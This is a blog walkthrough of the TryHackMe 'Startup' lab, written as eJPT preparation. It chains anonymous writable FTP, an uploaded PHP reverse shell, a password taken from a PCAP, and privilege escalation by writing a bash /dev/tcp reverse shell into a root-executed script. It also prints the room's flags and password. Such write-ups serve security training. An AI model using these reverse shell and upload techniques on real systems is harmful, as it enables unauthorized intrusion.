---
title: "Startup"
date: 2026-01-21
draft: false
description: "Walkthrough of Startup from TryHackMe. Anonymous FTP with writable directory, reverse shell via web, PCAP analysis with Wireshark and privilege escalation via misconfigured root script — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "wireshark",
    "pcap",
    "privesc",
    "web",
    "reverseshell",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 12
---

## Summary

**Startup** is the twelfth machine of the _Road to eJPTv2_ series. A machine that chains anonymous FTP with write access, reverse shell upload through web, forensic analysis of a PCAP file with Wireshark to obtain credentials, and a privilege escalation based on incorrect permissions on a script executed by root.

Multiple techniques in one machine — enumeration, web exploitation, network analysis, and misconfiguration-based privesc.

| Attribute      | Value                                                |
| -------------- | ---------------------------------------------------- |
| **Platform**   | TryHackMe                                            |
| **Difficulty** | Easy                                                 |
| **OS**         | Linux (Ubuntu)                                       |
| **Room**       | [Startup](https://tryhackme.com/room/startup)        |
| **Skills**     | FTP Enum, File Upload, PCAP Analysis, Script PrivEsc |

### 🎥 Video Walkthrough

{{< youtube EyEzcbH_rp8 >}}

> If you prefer to follow the walkthrough step by step, keep reading. The video covers the same process in visual format.

### Tools Used

- `nmap` — port scanning and version detection
- `ftp` — anonymous access and file upload
- `gobuster` — web directory fuzzing
- `netcat` — reverse shell listener and root shell receiver
- `python` — shell stabilization and HTTP server
- `wireshark` — PCAP file analysis
- `ssh` — access as lennie

### Solution Overview

1. **Recon:** nmap detects FTP with anonymous access, SSH and HTTP.
2. **Anonymous FTP:** `notice.txt` reveals user `maya`. The `ftp/` directory has full write permissions.
3. **Web fuzzing:** gobuster finds `/files/` — the FTP directory accessible from web.
4. **Reverse shell:** We upload a PHP reverse shell to FTP, trigger it from the browser and receive a connection as `www-data`.
5. **Post-exploitation:** `recipe.txt` answers a room question. In `/incidents/` we find a `suspicious.pcapng` which we analyze with Wireshark.
6. **Credentials:** The PCAP contains `lennie`'s password in plaintext: `c4ntg3t3n0ughsp1c3`.
7. **SSH as lennie:** We log in and get the user flag.
8. **PrivEsc:** `planner.sh` (root) calls `/etc/print.sh`, which is owned by `lennie`. We inject a reverse shell into `print.sh`, wait for execution and receive a root shell.

---

## Reconnaissance

### Ping

We verify connectivity and identify the OS by TTL:

```bash
ping -c 1 10.67.167.221
```

```
64 bytes from 10.67.167.221: icmp_seq=1 ttl=62 time=64.7 ms
```

TTL 62 → Linux (original value is 64, decremented through network hops).

### Nmap — Port Scan

```bash
nmap 10.67.167.221 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Three ports — FTP is immediately interesting for its anonymous access potential.

### Nmap — Versions and Scripts

```bash
nmap 10.67.167.221 -n -Pn -sS -p21,22,80 -sVC --min-rate=5000 -oN startupscan.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Nmap already gives us everything about the FTP: anonymous login allowed, and the `ftp/` subdirectory with `drwxrwxrwx` permissions — full write access for any user.

---

## FTP Enumeration

### Anonymous FTP

```bash
ftp 10.67.167.221 21
Name: anonymous
Password: [empty]
```

```
ftp> dir
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

We download both files:

```bash
ftp> get notice.txt
ftp> get important.jpg
```

Contents of `notice.txt`:

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
People downloading documents from our website will think we are a joke!
Now I dont know who it is, but Maya is looking pretty sus.
```

> **Username found:** `maya`

The `ftp/` directory is empty but has `777` permissions — we can upload files.

### Web Fuzzing — gobuster

```bash
gobuster dir -u http://10.67.167.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,bak,css,xml,.ssh
```

```
/index.html   (Status: 200)
/files        (Status: 301)
```

`/files/` points directly to the FTP contents — including the `ftp/` subdirectory with write permissions. This gives us remote code execution.

---

## Exploitation

### Reverse Shell via FTP + Web

We prepare a PHP reverse shell (PentestMonkey) and upload it to the FTP `ftp/` directory:

```bash
ftp> cd ftp
ftp> put rev.php
```

We set up a netcat listener:

```bash
nc -lvnp 1234
```

We trigger the shell by accessing it from the browser:

```
http://10.67.167.221/files/ftp/rev.php
```

```
connect to [192.168.136.70] from (UNKNOWN) [10.67.167.221] 36770
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Access as `www-data`.

### Shell Stabilization

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
www-data@startup:/$ export TERM=xterm
www-data@startup:/$ export SHELL=bash
```

---

## Post-Exploitation

### recipe.txt

```bash
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today.
I figured I can't keep it a secret forever and told him it was love.
```

> **Secret ingredient:** `love`

### incidents directory — Suspicious PCAP

Exploring the system we find an unusual directory at the root:

```bash
www-data@startup:/$ ls /incidents
suspicious.pcapng
```

We serve the file with Python to download it to our machine:

```bash
www-data@startup:/incidents$ python3 -m http.server 8080
```

On our attacker machine:

```bash
wget http://10.67.167.221:8080/suspicious.pcapng
```

### Wireshark — Plaintext Credentials

We open the PCAP with Wireshark and analyze the traffic. Following TCP streams we find credentials transmitted in plaintext:

> **lennie's password:** `c4ntg3t3n0ughsp1c3`

---

## Access as Lennie

### SSH with PCAP Credentials

```bash
ssh lennie@10.67.167.221
Password: c4ntg3t3n0ughsp1c3
```

```
lennie@startup:~$ whoami
lennie
```

### User Flag

```bash
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

> **User flag:** `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

---

## Privilege Escalation

### Enumeration — scripts/

```bash
lennie@startup:~$ ls -l scripts/
-rwxr-xr-x 1 root   root   77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root    1 Jan 22 02:55 startup_list.txt
```

```bash
lennie@startup:~$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`planner.sh` is owned by root and calls `/etc/print.sh`. We check `print.sh`'s permissions:

```bash
lennie@startup:~$ ls -l /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

`/etc/print.sh` is owned by `lennie` — we can modify it. When `planner.sh` executes it (as root), our code will run with root privileges.

### Exploitation — Injecting into print.sh

We set up a netcat listener:

```bash
nc -lvnp 4444
```

We replace `print.sh` contents with a reverse shell:

```bash
lennie@startup:~$ echo '#!/bin/bash' > /etc/print.sh
lennie@startup:~$ echo 'bash -i >& /dev/tcp/192.168.136.70/4444 0>&1' >> /etc/print.sh
```

We wait for the cron to execute `planner.sh` and receive the connection:

```bash
connect to [192.168.136.70] from (UNKNOWN) [10.67.167.221] 40054
root@startup:~#
```

### Root Flag

```bash
root@startup:~# cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

> **Root flag:** `THM{f963aaa6a430f210222158ae15c3d76d}`

---

## Lessons Learned

- **Anonymous FTP with write access is remote code execution** — An FTP directory with `777` permissions accessible from web equals RCE. Always check whether FTP directories have a web counterpart with gobuster.
- **PCAP files are forensic gold mines** — Plaintext credentials in network captures is a classic finding in CTFs and real incident analysis. Wireshark and `Follow TCP Stream` are essential skills.
- **Always check scripts called by root** — `planner.sh` calls `print.sh`. The call chain between scripts can create unexpected privesc vectors if any intermediate script has incorrect permissions.
- **Files in `/etc/` must be owned by root** — A script in `/etc/` owned by an unprivileged user is a guaranteed escalation if root executes it.
- **Plaintext traffic is never secure** — Passwords transmitted without encryption are vulnerable to anyone with network access or a traffic capture.

### For the eJPT

| Concept                          | eJPT Relevance                                |
| -------------------------------- | --------------------------------------------- |
| Anonymous FTP + write access     | Core network service enumeration in the exam  |
| File upload via FTP → RCE        | Realistic web exploitation vector             |
| PCAP analysis                    | Basic recon and forensic analysis             |
| PrivEsc via misconfigured script | Kernel-exploit-free escalation — exam pattern |

**Approximate completion time:** 45-60 minutes.

---

## References

- [Startup — TryHackMe](https://tryhackme.com/room/startup)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [Wireshark — Follow TCP Stream](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)
- [GTFOBins](https://gtfobins.github.io/)
